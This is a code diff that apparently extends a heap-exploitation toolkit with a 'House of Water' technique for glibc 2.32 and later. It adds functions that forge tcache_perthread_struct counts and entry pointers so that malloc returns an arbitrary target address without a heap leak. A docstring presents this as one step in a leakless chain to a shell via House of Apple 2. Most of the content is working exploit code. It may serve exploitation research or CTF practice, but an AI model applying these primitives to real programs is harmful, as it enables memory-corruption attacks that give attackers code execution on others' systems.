@@ -161,6 +161,62 @@ def groom_reclaim(req: int) -> dict:
             "result": "CONTROLLED is allocated at VICTIM's address (same size-class, LIFO)."}
 
 
+# --- House of Water: a LEAKLESS arbitrary allocation on modern glibc (>= 2.32) -------------------
+# tcache_perthread_struct layout (glibc 2.32+): uint16_t counts[64]; tcache_entry *entries[64];
+_TC_BINS = 64
+_TC_COUNTS_OFF = 0
+_TC_ENTRIES_OFF = _TC_BINS * 2                            # 0x80
+
+
+def forge_tcache_perthread(idx: int, target: int, *, count: int = 1) -> dict:
+    """Forge the two fields of tcache_perthread_struct that hand out an arbitrary chunk WITHOUT a
+    leak: counts[idx] (so malloc believes the bin is non-empty) and entries[idx] := target. The
+    entries[] HEAD pointers are stored UNMANGLED (safe-linking, glibc>=2.32, only mangles the per-
+    chunk `fd`), so no heap-address leak is needed to point the bin head at `target` -- this is the
+    leakless core of House of Water. Returns byte writes {offset: bytes} into the struct."""
+    if not 0 <= idx < _TC_BINS:
+        raise ValueError(f"tcache index {idx} out of range 0..{_TC_BINS - 1}")
+    return {
+        _TC_COUNTS_OFF + idx * 2: _struct_u16(count),
+        _TC_ENTRIES_OFF + idx * 8: _struct_u64(target),
+    }
+
+
+def house_of_water_recipe(req: int, *, target_name: str = "TARGET") -> dict:
+    """Leakless arbitrary allocation (House of Water, glibc>=2.32). Precondition: a write into the
+    tcache_perthread_struct (House of Water grooms an overlapping/adjacent chunk to get it; here we
+    treat that write as the primitive, like tcache_poison_recipe treats the UAF). Corrupt
+    counts[idx] and entries[idx] := target -- both UNMANGLED -- then malloc(size) returns target.
+    No heap leak, no fd mangling, no double-free key dance. Pairs with House of Apple 2 for a fully
+    leakless FSOP -> shell on >= 2.34."""
+    cs = request2size(req)
+    if not in_tcache_range(cs):
+        return {"ok": False, "reason": f"size {req} (chunk {hex(cs)}) is outside tcache range"}
+    idx = tcache_index(cs)
+    return {
+        "ok": True, "chunk_size": cs, "tcache_index": idx,
+        "leakless": True,
+        "ops": [
+            ("write_tcache_struct", f"counts[{idx}]", "1"),
+            ("write_tcache_struct", f"entries[{idx}]", f"addr({target_name})"),
+            ("alloc", "OUT", req),                         # returns TARGET
+        ],
+        "forge": forge_tcache_perthread,                   # forge_tcache_perthread(idx, target)
+        "notes": ("tcache_perthread_struct entries[] heads are NOT safe-linked (only the per-chunk "
+                  "fd is), so the bin head can be pointed at an arbitrary address with no heap leak "
+                  "-- glibc >= 2.32. Requires a write into the per-thread struct (grooved)."),
+        "result": f"malloc({req}) returns {target_name} (arbitrary allocation, leakless).",
+    }
+
+
+def _struct_u16(v):
+    return _struct.pack("<H", v & 0xFFFF)
+
+
+def _struct_u64(v):
+    return _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)
+
+
 # --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
 import struct as _struct  # noqa: E402
 
